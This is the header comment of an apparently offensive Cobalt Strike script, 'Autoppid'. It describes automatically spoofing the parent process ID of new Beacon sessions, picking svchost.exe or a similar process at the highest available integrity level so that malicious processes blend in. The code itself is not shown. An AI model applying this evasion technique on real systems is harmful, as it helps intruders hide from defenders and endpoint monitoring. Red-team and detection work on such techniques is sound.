#
# Autoppid - script that smartely invokes PPID for every new checkin in Beacon. 
# PPID command requires invoked Beacon to have the same Integrity level as the process it want's
# to assume as it's Parent. That's due to how InitializeProcThreadAttributeList with 
# PROC_THREAD_ATTRIBUTE_PARENT_PROCESS works. In order to avoid harcoded explorer.exe PID assumption,
# we can look around for a configurable process name and then try to find that process running
# on the highest available for us integrity level. In that case, unprivileged user would assume PPID
# of for instance svchost.exe running as that user, wherease the privileged one - could go for the
# svchost.exe running as NT AUTHORITY\SYSTEM. We aim to smartely pick the most advantageous target,
# in a dynamic fashion.
#
# The script also includes alias registration.
